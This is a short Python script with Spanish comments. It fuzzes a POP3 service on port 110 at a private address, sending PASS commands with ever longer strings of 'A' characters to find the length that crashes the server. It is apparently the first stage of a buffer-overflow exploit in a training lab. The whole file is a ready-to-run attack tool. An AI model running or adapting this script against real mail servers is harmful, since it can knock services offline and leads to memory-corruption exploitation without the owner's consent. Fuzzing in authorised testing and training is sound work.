#!/usr/bin/python3

import socket
import sys

def fuzzing(ip, port):
    buffer = ["A"]
    padding = 100

    while len(buffer) < 50:
        buffer.append("A" * padding)
        padding += 200

    for strings in buffer:
        print(f"Enviando {len(strings)} bytes...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.recv(1024)  # Recibir respuesta del servidor
            s.send(b'USER eraldo\r\n')
            s.recv(1024)
            s.send(f'PASS {strings}\r\n'.encode())  # Convertir a bytes
            s.recv(1024)
            s.close()
        except socket.error as e:
            print(f"\n[!] Error de conexión: {e}\n")
            sys.exit(1)

if __name__ == "__main__":
    target_ip = '192.168.1.2'
    target_port = int('110')
    fuzzing(target_ip, target_port)
